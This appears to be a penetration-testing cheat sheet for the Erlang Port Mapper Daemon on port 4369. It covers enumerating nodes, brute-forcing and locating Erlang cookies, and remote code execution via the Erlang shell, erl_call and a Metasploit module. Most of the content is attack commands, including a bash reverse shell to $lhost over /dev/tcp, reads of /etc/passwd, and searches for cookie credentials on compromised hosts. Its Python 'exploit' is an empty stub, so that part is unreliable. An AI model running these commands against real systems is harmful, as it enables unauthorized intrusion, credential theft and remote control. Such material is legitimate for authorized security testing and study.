# Port 4369 - Erlang Port Mapper Daemon (EPMD)

## Table of Contents

- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Remote Code Execution](#remote-code-execution)

---

## Enumeration

### Quick Check (One-liner)

```shell
nmap -p 4369 --script "epmd-info" $rhost && epmd -names -host $rhost
```

### Nmap Scripts

```shell
nmap -sV -sC -p4369 $rhost
nmap -p4369 --script "epmd-info" $rhost
```

### Banner Grabbing

```shell
nc -vn $rhost 4369
```

### List Erlang Nodes

```shell
# Using epmd command
epmd -names -host $rhost

# Using nmap
nmap -p4369 --script "epmd-info" $rhost
```

### Identify Node Names

```shell
# EPMD returns node names and their ports
# Example output:
# name rabbit at port 25672
# name ejabberd at port 41412
```

---

## Exploitation

### Connect to Erlang Node

> Requires knowing the Erlang cookie

```shell
# Default cookie locations
~/.erlang.cookie
/var/lib/rabbitmq/.erlang.cookie
/var/lib/ejabberd/.erlang.cookie

# Common default cookies
cookie = "COOKIE"
cookie = "rabbit"
```

### Brute Force Cookie

```shell
# Using erl_exploits
# https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/erlang_cookie_rce.rb

# Custom brute force
for cookie in $(cat cookies.txt); do
  erl -name attacker@$lhost -setcookie $cookie -remsh node@$rhost
done
```

### Metasploit Module

```shell
msfconsole
use auxiliary/gather/erlang_cookie_rce
set RHOSTS $rhost
set COOKIE ERLANGCOOKIE
run
```

---

## Remote Code Execution

### Using Erlang Shell

```shell
# Connect to remote node
erl -name attacker@$lhost -setcookie THECOOKIE -remsh node@$rhost

# Execute commands
os:cmd("id").
os:cmd("whoami").
os:cmd("cat /etc/passwd").

# Reverse shell
os:cmd("bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'").
```

### Python Script

```python
#!/usr/bin/env python3
import socket
import struct

def exploit(host, port, cookie, command):
    # Erlang distribution protocol implementation
    # ... complex protocol handling
    pass

# Usage
exploit("$rhost", 25672, "COOKIE", "id")
```

### Using erl_call

```shell
# Connect and execute
erl_call -c COOKIE -n node@$rhost -a 'os cmd ["id"]'

# Multiple commands
erl_call -c COOKIE -n node@$rhost -a 'os cmd ["whoami"]'
erl_call -c COOKIE -n node@$rhost -a 'os cmd ["cat /etc/passwd"]'
```

---

## Common Erlang Services

| Service | Node Name | Default Port |
|---------|-----------|--------------|
| RabbitMQ | rabbit@ | 25672 |
| ejabberd | ejabberd@ | Various |
| CouchDB | couchdb@ | Various |
| Riak | riak@ | Various |

### RabbitMQ Exploitation

```shell
# Find RabbitMQ node
nmap -p4369 --script "epmd-info" $rhost

# Connect (default cookie might be in /var/lib/rabbitmq/.erlang.cookie)
erl -name attacker@$lhost -setcookie RABBITMQCOOKIE -remsh rabbit@$rhost

# RabbitMQ specific commands
rabbit_misc:execute_mnesia_transaction(fun() -> ok end).
```

---

## Finding Cookies

```shell
# Search for cookies on compromised system
find / -name ".erlang.cookie" 2>/dev/null
cat /var/lib/rabbitmq/.erlang.cookie
cat ~/.erlang.cookie

# Environment variables
env | grep -i erlang
env | grep -i cookie

# Process arguments
ps aux | grep erl | grep cookie
```

---

## Tools

- erl (Erlang shell)
- epmd
- Metasploit erlang_cookie_rce

---

## References

- [HackTricks - Erlang EPMD](https://book.hacktricks.wiki/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html)
